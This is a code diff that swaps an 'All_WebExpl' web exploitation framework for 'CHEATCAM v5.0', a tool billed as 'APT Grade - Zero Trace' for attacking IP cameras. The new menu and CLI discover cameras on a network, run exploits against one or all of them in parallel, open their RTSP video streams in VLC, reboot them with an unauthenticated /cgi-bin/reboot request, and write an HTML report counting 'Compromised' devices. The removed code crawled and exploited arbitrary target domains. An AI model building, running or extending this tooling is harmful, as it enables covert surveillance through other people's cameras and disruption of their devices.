+{Colors.BOLD}CHEATCAM v5.0 - Attack Menu{Colors.WHITE}
+{Colors.CYAN}APT Grade - Zero Trace - AI-Powered{Colors.WHITE}
+{Colors.BLUE}{'='*60}{Colors.WHITE}
+[1] Discover Cameras (Advanced)
+[2] Show Cameras
+[3] AI-Powered Exploit Camera
+[4] Exploit All Cameras
+[5] View Camera Stream
+[6] Reboot Camera
+[7] Get Camera Info
+[8] Show Results
+[9] Generate Report
+[10] Exit
+""")
+    
+    def discover(self):
+        discovery = AdvancedCameraDiscovery(self.interface)
+        self.cameras = discovery.discover()
+    
+    def show_cameras(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.YELLOW)
+            return
+        
+        print("\n" + "="*60)
+        cprint(" CAMERAS", Colors.PURPLE, bold=True)
+        print("="*60)
+        for i, c in enumerate(self.cameras):
+            vuln_status = "🔴" if c.vuln_cves else "🟢"
+            print(f"{i}. {c.ip} - {c.brand} {vuln_status}")
+            print(f"   Model: {c.model}")
+            print(f"   Firmware: {c.firmware}")
+            print(f"   Ports: {c.api_paths[:3]}")
+        print("="*60)
+    
+    def exploit_camera(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.RED)
+            return
+        
+        self.show_cameras()
+        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
+        
+        try:
+            idx = int(choice)
+            if 0 <= idx < len(self.cameras):
+                exploit = AdvancedCameraExploit(self.cameras[idx])
+                result = exploit.exploit()
+                self.results.append(result)
+                
+                # Learn from result
+                for cve in exploit.camera.vuln_cves:
+                    self.ai_engine.learn_from_result(cve, result['success'])
+                
+                cprint("\n[+] Exploitation complete!", Colors.GREEN)
+        except:
+            cprint("[-] Invalid selection", Colors.RED)
+    
+    def exploit_all(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.RED)
+            return
+        
+        cprint("[*] Exploiting all cameras...", Colors.RED)
+        
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(AdvancedCameraExploit(cam).exploit): cam for cam in self.cameras}
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    self.results.append(result)
+                    cprint("[+] Camera exploited", Colors.GREEN)
+                except:
+                    cprint("[-] Exploitation failed", Colors.RED)
+        
+        cprint("[+] All cameras exploited!", Colors.GREEN)
+    
+    def view_stream(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.RED)
+            return
+        
+        self.show_cameras()
+        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
+        
+        try:
+            idx = int(choice)
+            if 0 <= idx < len(self.cameras):
+                # Try RTSP
+                rtsp = f"rtsp://{self.cameras[idx].ip}:554/stream1"
+                try:
+                    subprocess.Popen(['vlc', rtsp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    cprint("[+] VLC opened", Colors.GREEN)
+                except:
+                    cprint("[!] VLC not available", Colors.YELLOW)
+        except:
+            cprint("[-] Invalid selection", Colors.RED)
+    
+    def reboot_camera(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.RED)
+            return
+        
+        self.show_cameras()
+        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
+        
+        try:
+            idx = int(choice)
+            if 0 <= idx < len(self.cameras):
+                camera = self.cameras[idx]
+                try:
+                    url = f"http://{camera.ip}/cgi-bin/reboot"
+                    response = requests.get(url, timeout=3)
+                    if response.status_code == 200:
+                        cprint("[+] Camera rebooted", Colors.GREEN)
+                    else:
+                        cprint("[-] Reboot failed", Colors.RED)
+                except:
+                    cprint("[-] Reboot failed", Colors.RED)
+        except:
+            cprint("[-] Invalid selection", Colors.RED)
+    
+    def get_info(self):
+        if not self.cameras:
+            cprint("[!] No cameras", Colors.RED)
+            return
+        
+        self.show_cameras()
+        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
+        
+        try:
+            idx = int(choice)
+            if 0 <= idx < len(self.cameras):
+                camera = self.cameras[idx]
+                print("\n" + "="*60)
+                cprint(" CAMERA INFO", Colors.PURPLE, bold=True)
+                print("="*60)
+                print(f"IP: {camera.ip}")
+                print(f"MAC: {camera.mac}")
+                print(f"Brand: {camera.brand}")
+                print(f"Model: {camera.model}")
+                print(f"Firmware: {camera.firmware}")
+                print(f"Ports: {camera.port}")
+                print(f"Vulnerabilities: {', '.join(camera.vuln_cves) if camera.vuln_cves else 'None'}")
+                print("="*60)
+        except:
+            cprint("[-] Invalid selection", Colors.RED)
+    
+    def show_results(self):
+        print("\n" + "="*60)
+        cprint(" RESULTS", Colors.PURPLE, bold=True)
+        print("="*60)
+        
+        if not self.results:
+            cprint("[!] No results", Colors.YELLOW)
+            return
+        
+        for i, result in enumerate(self.results):
+            cprint(f"\n[{i+1}] Camera", Colors.CYAN)
+            for key, value in result.items():
+                if value:
+                    if isinstance(value, list):
+                        cprint(f"  {key}: {len(value)} items", Colors.DIM)
+                        for item in value[:3]:
+                            if isinstance(item, dict):
+                                cprint(f"    - {str(item)[:100]}", Colors.DIM)
+                    elif isinstance(value, dict):
+                        for k, v in value.items():
+                            if v:
+                                cprint(f"  {k}: {v}", Colors.DIM)
+                    else:
+                        cprint(f"  {key}: {value}", Colors.DIM)
+        
+        print("="*60)
+    
+    def generate_report(self):
+        """Generate comprehensive HTML report"""
+        cprint("[REPORT] Generating report...", Colors.GOLD)
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"cheatcam_report_{timestamp}.html"
         
         html = f"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>All_WebExpl - Security Report</title>
+    <title>CHEATCAM v5.0 - Security Report</title>
     <style>
-        body {{ background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }}
+        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
         .header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; margin-bottom: 20px; }}
         .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; }}
         .critical {{ color: #ff003c; }}
         .high {{ color: #ff8a00; }}
         .medium {{ color: #ffa500; }}
         .low {{ color: #ffd700; }}
-        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; margin: 2px; }}
-        .badge-critical {{ background: #ff003c; color: white; }}
-        .badge-high {{ background: #ff8a00; color: white; }}
-        .badge-medium {{ background: #ffa500; color: white; }}
-        .badge-low {{ background: #ffd700; color: black; }}
-        table {{ width: 100%; border-collapse: collapse; }}
-        td, th {{ padding: 8px; border: 1px solid #333; }}
-        th {{ background: #222; color: #ffd700; }}
-        .gold {{ color: #ffd700; }}
         .stat-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 10px 0; }}
         .stat-card {{ background: #1a1a1a; padding: 15px; text-align: center; border: 1px solid #333; border-radius: 8px; }}
         .stat-number {{ font-size: 28px; font-weight: bold; }}
-        .remediation {{ background: #1a2a1a; padding: 10px; border-left: 3px solid #00ff41; }}
+        table {{ width: 100%; border-collapse: collapse; }}
+        td, th {{ padding: 8px; border: 1px solid #333; }}
+        th {{ background: #222; color: #ffd700; }}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1 class="gold">All_WebExpl - Security Assessment Report</h1>
-        <p>Target: <span class="gold">{results.get('target', 'Unknown')}</span></p>
+        <h1 class="gold">CHEATCAM v5.0 - Security Assessment Report</h1>
         <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
         <p>Author: {AUTHOR}</p>
     </div>
-
+    
     <div class="section">
         <h2 class="gold">Executive Summary</h2>
         <div class="stat-grid">
             <div class="stat-card">
-                <div class="stat-number" style="color:#ffd700;">{len(vulns)}</div>
-                <div>Total Issues</div>
+                <div class="stat-number" style="color:#ffd700;">{len(self.cameras)}</div>
+                <div>Cameras</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" style="color:#ff003c;">{len([v for v in vulns if v.get('severity') == 'Critical'])}</div>
-                <div>Critical</div>
+                <div class="stat-number" style="color:#ff003c;">{len([c for c in self.cameras if c.vuln_cves])}</div>
+                <div>Vulnerable</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" style="color:#ff8a00;">{len([v for v in vulns if v.get('severity') == 'High'])}</div>
-                <div>High</div>
+                <div class="stat-number" style="color:#ff8a00;">{len(self.results)}</div>
+                <div>Exploited</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" style="color:#ffa500;">{len([v for v in vulns if v.get('severity') == 'Medium'])}</div>
-                <div>Medium</div>
+                <div class="stat-number" style="color:#4ecdc4;">{sum(1 for r in self.results if r.get('success'))}</div>
+                <div>Compromised</div>
             </div>
         </div>
-        <p>Endpoints: {len(endpoints)} | API Endpoints: {len(results.get('api_endpoints', []))}</p>
     </div>
-
+    
     <div class="section">
-        <h2 class="gold">Vulnerability Breakdown</h2>
+        <h2 class="gold">Cameras Found</h2>
         <table>
-            <tr><th>Type</th><th>Count</th><th>Severity</th></tr>
-            {ReportGenerator._generate_summary_table(vulns)}
+            <tr><th>IP</th><th>Brand</th><th>Model</th><th>Vulnerabilities</th></tr>
+"""
+        
+        for cam in self.cameras:
+            vulns = ', '.join(cam.vuln_cves) if cam.vuln_cves else 'None'
+            color = 'critical' if cam.vuln_cves else 'low'
+            html += f"""
+            <tr>
+                <td>{cam.ip}</td>
+                <td>{cam.brand}</td>
+                <td>{cam.model}</td>
+                <td class="{color}">{vulns}</td>
+            </tr>
+"""
+        
+        html += """
         </table>
     </div>
-
-    <div class="section">
-        <h2 class="gold">Detailed Vulnerabilities</h2>
-        {ReportGenerator._generate_vuln_details(vulns)}
-    </div>
-
-    <div class="section">
-        <h2 class="gold">Recommendations</h2>
-        <div class="remediation">
-            <h3>Priority Remediation:</h3>
-            <ul>
-                <li>Critical issues - Address immediately</li>
-                <li>Implement input validation for all user inputs</li>
-                <li>Use parameterized queries for database operations</li>
-                <li>Implement proper authorization checks</li>
-                <li>Add security headers (CSP, HSTS, X-Frame-Options)</li>
-                <li>Remove sensitive information from responses</li>
-                <li>Conduct regular security assessments</li>
-            </ul>
-        </div>
-    </div>
-
-    <div class="section" style="text-align:center; color:#666; font-size:12px;">
-        <p>Report generated by All_WebExpl v{VERSION}</p>
-        <p>Author: {AUTHOR} | {LICENSE}</p>
+    
+    <div class="section" style="text-align:center;color:#666;">
+        <p>Report generated by CHEATCAM v5.0</p>
+        <p>Author: F1REW0LF | MIT License</p>
         <p>For authorized security testing only</p>
     </div>
 </body>
@@ -1165,360 +1159,91 @@ class ReportGenerator:
         with open(filename, 'w', encoding='utf-8') as f:
             f.write(html)
         
-        return filename
-    
-    @staticmethod
-    def _generate_summary_table(vulns: List) -> str:
-        if not vulns:
-            return "<tr><td colspan='3'>No issues found</td></tr>"
-        
-        counts = defaultdict(int)
-        severities = {}
-        for v in vulns:
-            v_type = v.get('type', 'Unknown')
-            counts[v_type] += 1
-            if v_type not in severities:
-                severity = v.get('severity', 'Low')
-                if 'Critical' in severity or 'RCE' in v_type or 'SQL' in v_type:
-                    severities[v_type] = 'Critical'
-                elif 'High' in severity or 'XSS' in v_type or 'LFI' in v_type:
-                    severities[v_type] = 'High'
-                else:
-                    severities[v_type] = 'Medium'
-        
-        html = ""
-        for v_type, count in sorted(counts.items(), key=lambda x: -x[1]):
-            severity = severities.get(v_type, 'Medium')
-            badge = f"badge-{severity.lower()}"
-            html += f"""
-            <tr>
-                <td>{v_type}</td>
-                <td>{count}</td>
-                <td><span class="badge {badge}">{severity}</span></td>
-            </tr>"""
-        return html
-    
-    @staticmethod
-    def _generate_vuln_details(vulns: List) -> str:
-        if not vulns:
-            return "<p>No vulnerabilities detected</p>"
-        
-        html = ""
-        for i, vuln in enumerate(vulns, 1):
-            severity = vuln.get('severity', 'Low')
-            badge = f"badge-{severity.lower()}"
-            color = '#' + {'Critical': 'ff003c', 'High': 'ff8a00', 'Medium': 'ffa500', 'Low': 'ffd700'}.get(severity, '666')
-            
-            html += f"""
-            <div style="background:#1a1a1a; padding:10px; margin:5px 0; border-left:3px solid {color};">
-                <strong>#{i}</strong> <span class="badge {badge}">{severity}</span>
-                <strong>{vuln.get('type', 'Unknown')}</strong>
-                <br><span class="timestamp">URL: {vuln.get('url', 'N/A')[:100]}</span>
-                <br><span class="timestamp">Parameter: {vuln.get('parameter', 'N/A')}</span>
-                <br><span class="timestamp">CWE: {vuln.get('cwe', 'N/A')}</span>
-                <br><span class="timestamp">Confidence: {vuln.get('confidence', 0.0) * 100:.0f}%</span>
-                <br><span class="timestamp">Description: {vuln.get('description', '')}</span>
-                <br><span class="timestamp">Remediation: {vuln.get('remediation', '')}</span>
-            </div>"""
-        return html
-
-# ============================[ MAIN FRAMEWORK ]================================
-class AllWebExpl:
-    """All_WebExpl - Advanced Web Exploitation Framework"""
-    
-    def __init__(self):
-        self.stealth = UltimateStealth()
-        self.results = {}
-        self.running = True
-        
-        signal.signal(signal.SIGINT, self.signal_handler)
-        signal.signal(signal.SIGTERM, self.signal_handler)
-    
-    def signal_handler(self, signum, frame):
-        cprint("\n[!] All_WebExpl shutting down...", Colors.RED)
-        self.running = False
-        sys.exit(0)
-    
-    def show_menu(self):
-        print(f"""
-{Colors.BLUE}{'='*60}{Colors.WHITE}
-{Colors.BOLD}All_WebExpl v{VERSION} - Attack Menu{Colors.WHITE}
-{Colors.RED}{Colors.BOLD}Deep Attack | Intelligent | Stealth | Wide Coverage{Colors.WHITE}
-{Colors.CYAN}Author: {AUTHOR}{Colors.WHITE}
-{Colors.BLUE}{'='*60}{Colors.WHITE}
-[1] Full Exploitation (All Vectors)
-[2] Reconnaissance Only
-[3] Vulnerability Scan Only
-[4] Deep Exploitation (Advanced Vectors)
-[5] Generate Report
-[6] Show Results
-[7] Exit
-""")
-    
-    def full_exploitation(self):
-        target = input("[>] Target Domain: ").strip()
-        if not target:
-            cprint("[-] Target required", Colors.RED)
-            return
-        
-        cprint("\n[START] Full exploitation on {}".format(target), Colors.RED, bold=True)
-        
-        start_time = time.time()
-        
-        # Phase 1: Crawl
-        crawler = IntelligentCrawler(target, self.stealth)
-        crawl_results = crawler.crawl()
-        
-        # Phase 2: Exploit
-        exploit_engine = AdvancedExploitation(target, self.stealth)
-        vulns = exploit_engine.exploit_all(
-            crawl_results['endpoints'],
-            crawl_results['api_endpoints'],
-            crawl_results['parameters']
-        )
-        
-        # Results
-        self.results = {
-            'target': target,
-            'timestamp': datetime.now().isoformat(),
-            'endpoints': [e.url for e in crawl_results['endpoints']],
-            'api_endpoints': crawl_results['api_endpoints'],
-            'js_files': crawl_results['js_files'],
-            'parameters': crawl_results['parameters'],
-            'forms': crawl_results['forms'],
-            'uploads': crawl_results['uploads'],
-            'vulnerabilities': vulns,
-            'duration': int(time.time() - start_time)
-        }
-        
-        cprint(f"\n[+] Exploitation complete!", Colors.GREEN)
-        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
-        cprint(f"[+] Duration: {self.results['duration']} seconds", Colors.CYAN)
-    
-    def recon_only(self):
-        target = input("[>] Target Domain: ").strip()
-        if not target:
-            cprint("[-] Target required", Colors.RED)
-            return
-        
-        cprint("[START] Reconnaissance on {}".format(target), Colors.BLUE)
-        
-        crawler = IntelligentCrawler(target, self.stealth)
-        results = crawler.crawl()
-        
-        self.results = {
-            'target': target,
-            'timestamp': datetime.now().isoformat(),
-            'endpoints': [e.url for e in results['endpoints']],
-            'api_endpoints': results['api_endpoints'],
-            'js_files': results['js_files'],
-            'parameters': results['parameters'],
-            'forms': results['forms'],
-            'uploads': results['uploads']
-        }
-        
-        cprint(f"\n[+] Reconnaissance complete!", Colors.GREEN)
-        cprint(f"[+] Endpoints: {len(self.results['endpoints'])}", Colors.CYAN)
-        cprint(f"[+] API endpoints: {len(self.results['api_endpoints'])}", Colors.CYAN)
-    
-    def vuln_scan(self):
-        if not self.results.get('endpoints'):
-            cprint("[!] Run reconnaissance first", Colors.YELLOW)
-            return
-        
-        target = self.results['target']
-        cprint("[START] Vulnerability scan on {}".format(target), Colors.YELLOW)
-        
-        # Convert endpoints to Endpoint objects
-        endpoints = []
-        for url in self.results['endpoints']:
-            endpoints.append(Endpoint(url=url))
-        
-        exploit_engine = AdvancedExploitation(target, self.stealth)
-        vulns = exploit_engine.exploit_all(
-            endpoints,
-            self.results.get('api_endpoints', []),
-            self.results.get('parameters', [])
-        )
-        
-        self.results['vulnerabilities'] = vulns
-        
-        cprint(f"\n[+] Scan complete!", Colors.GREEN)
-        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
-    
-    def deep_exploitation(self):
-        if not self.results.get('endpoints'):
-            cprint("[!] Run reconnaissance first", Colors.YELLOW)
-            return
-        
-        target = self.results['target']
-        cprint("[START] Deep exploitation on {}".format(target), Colors.RED, bold=True)
-        
-        endpoints = [Endpoint(url=u) for u in self.results['endpoints']]
-        exploit_engine = AdvancedExploitation(target, self.stealth)
-        vulns = exploit_engine.exploit_all(
-            endpoints,
-            self.results.get('api_endpoints', []),
-            self.results.get('parameters', [])
-        )
-        
-        self.results['vulnerabilities'] = vulns
-        
-        cprint(f"\n[+] Deep exploitation complete!", Colors.GREEN)
-        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
-    
-    def generate_report(self):
-        if not self.results:
-            cprint("[!] No results to report", Colors.YELLOW)
-            return
-        
-        filename = ReportGenerator.generate(self.results)
         cprint(f"[+] Report generated: {filename}", Colors.GREEN)
-    
-    def show_results(self):
-        print("\n" + "="*60)
-        cprint(" All_WebExpl RESULTS", Colors.PURPLE, bold=True)
-        print("="*60)
-        
-        if not self.results:
-            cprint("[!] No results", Colors.YELLOW)
-            return
-        
-        cprint(f"\n[Target] {self.results.get('target', 'N/A')}", Colors.CYAN)
-        cprint(f"[Endpoints] {len(self.results.get('endpoints', []))}", Colors.CYAN)
-        cprint(f"[API Endpoints] {len(self.results.get('api_endpoints', []))}", Colors.CYAN)
-        cprint(f"[JS Files] {len(self.results.get('js_files', []))}", Colors.CYAN)
-        cprint(f"[Parameters] {len(self.results.get('parameters', []))}", Colors.CYAN)
-        cprint(f"[Forms] {len(self.results.get('forms', []))}", Colors.CYAN)
-        cprint(f"[Uploads] {len(self.results.get('uploads', []))}", Colors.CYAN)
-        cprint(f"[Vulnerabilities] {len(self.results.get('vulnerabilities', []))}", Colors.RED)
-        
-        if self.results.get('vulnerabilities'):
-            cprint("\n[!] Vulnerabilities:", Colors.RED)
-            for vuln in self.results['vulnerabilities'][:10]:
-                severity = vuln.get('severity', 'Low')
-                color = Colors.RED if severity == 'Critical' else Colors.YELLOW
-                cprint(f"    - {vuln.get('type', 'Unknown')} ({severity}): {vuln.get('url', 'N/A')[:60]}", color)
-        
-        print("="*60)
+        return filename
     
     def run(self):
         print_banner()
-        cprint("[*] All_WebExpl - Advanced Web Exploitation Framework", Colors.CYAN)
-        cprint("[*] Deep Attack | Intelligent | Stealth | Wide Coverage", Colors.DIM)
-        cprint("[!] WARNING: This tool is EXTREMELY DANGEROUS", Colors.RED)
-        cprint("[!] Use only in authorized environments", Colors.RED)
+        cprint("[*] CHEATCAM v5.0 - APT Grade Camera Testing", Colors.CYAN)
+        cprint("[*] Zero Trace - AI-Powered - Military Grade", Colors.DIM)
         
-        while self.running:
+        while True:
             self.show_menu()
             choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
             
             if choice == '1':
-                self.full_exploitation()
+                self.discover()
             elif choice == '2':
-                self.recon_only()
+                self.show_cameras()
             elif choice == '3':
-                self.vuln_scan()
+                self.exploit_camera()
             elif choice == '4':
-                self.deep_exploitation()
+                self.exploit_all()
             elif choice == '5':
-                self.generate_report()
+                self.view_stream()
             elif choice == '6':
-                self.show_results()
+                self.reboot_camera()
             elif choice == '7':
-                cprint("[*] All_WebExpl shutting down...", Colors.GREEN)
+                self.get_info()
+            elif choice == '8':
+                self.show_results()
+            elif choice == '9':
+                self.generate_report()
+            elif choice == '10':
+                cprint("[*] Exiting...", Colors.GREEN)
                 break
             else:
                 cprint("[-] Invalid selection", Colors.RED)
 
-# ============================[ MAIN ]================================
+# ==================== MAIN ====================
 def main():
     parser = argparse.ArgumentParser(
-        description="All_WebExpl - Advanced Web Exploitation Framework",
+        description="CHEATCAM v5.0 - APT Grade Camera Testing",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python3 all_webexpl.py -t example.com --full
-  python3 all_webexpl.py -t example.com --recon
-  python3 all_webexpl.py -t example.com --deep
+  python3 cheatcam.py --discover
+  python3 cheatcam.py --exploit --target 192.168.1.100
+  python3 cheatcam.py --interface eth0 --exploit-all
         """
     )
     
-    parser.add_argument("-t", "--target", help="Target domain")
-    parser.add_argument("--full", action="store_true", help="Full exploitation")
-    parser.add_argument("--recon", action="store_true", help="Reconnaissance only")
-    parser.add_argument("--deep", action="store_true", help="Deep exploitation")
+    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
+    parser.add_argument("--discover", action="store_true", help="Discover only")
+    parser.add_argument("--exploit", help="Exploit specific camera IP")
+    parser.add_argument("--exploit-all", action="store_true", help="Exploit all cameras")
     parser.add_argument("--report", action="store_true", help="Generate report")
     
     args = parser.parse_args()
     
-    tool = AllWebExpl()
+    if os.geteuid() != 0:
+        cprint("[!] Root privileges required", Colors.RED)
+        sys.exit(1)
     
-    if args.target and args.full:
-        tool.results['target'] = args.target
-        # Run full exploitation
-        crawler = IntelligentCrawler(args.target, tool.stealth)
-        crawl_results = crawler.crawl()
-        exploit_engine = AdvancedExploitation(args.target, tool.stealth)
-        vulns = exploit_engine.exploit_all(
-            crawl_results['endpoints'],
-            crawl_results['api_endpoints'],
-            crawl_results['parameters']
-        )
-        tool.results = {
-            'target': args.target,
-            'timestamp': datetime.now().isoformat(),
-            'endpoints': [e.url for e in crawl_results['endpoints']],
-            'api_endpoints': crawl_results['api_endpoints'],
-            'vulnerabilities': vulns
-        }
-        if args.report:
-            ReportGenerator.generate(tool.results)
-        tool.show_results()
+    tool = CheatCamUltimate(args.interface)
+    
+    if args.discover:
+        tool.discover()
+        tool.show_cameras()
         sys.exit(0)
     
-    if args.target and args.recon:
-        crawler = IntelligentCrawler(args.target, tool.stealth)
-        results = crawler.crawl()
-        tool.results = {
-            'target': args.target,
-            'timestamp': datetime.now().isoformat(),
-            'endpoints': [e.url for e in results['endpoints']],
-            'api_endpoints': results['api_endpoints'],
-            'js_files': results['js_files'],
-            'parameters': results['parameters'],
-            'forms': results['forms'],
-            'uploads': results['uploads']
-        }
-        if args.report:
-            ReportGenerator.generate(tool.results)
-        tool.show_results()
+    if args.exploit:
+        tool.discover()
+        for cam in tool.cameras:
+            if cam.ip == args.exploit:
+                exploit = AdvancedCameraExploit(cam)
+                result = exploit.exploit()
+                tool.results.append(result)
+                break
         sys.exit(0)
     
-    if args.target and args.deep:
-        tool.results['target'] = args.target
-        crawler = IntelligentCrawler(args.target, tool.stealth)
-        crawl_results = crawler.crawl()
-        exploit_engine = AdvancedExploitation(args.target, tool.stealth)
-        vulns = exploit_engine.exploit_all(
-            crawl_results['endpoints'],
-            crawl_results['api_endpoints'],
-            crawl_results['parameters']
-        )
-        tool.results = {
-            'target': args.target,
-            'timestamp': datetime.now().isoformat(),
-            'endpoints': [e.url for e in crawl_results['endpoints']],
-            'api_endpoints': crawl_results['api_endpoints'],
-            'vulnerabilities': vulns
-        }
-        if args.report:
-            ReportGenerator.generate(tool.results)
-        tool.show_results()
+    if args.exploit_all:
+        tool.discover()
+        tool.exploit_all()
         sys.exit(0)
     
-    if args.report and tool.results:
-        ReportGenerator.generate(tool.results)
+    if args.report:
+        tool.generate_report()
         sys.exit(0)
     
     tool.run()
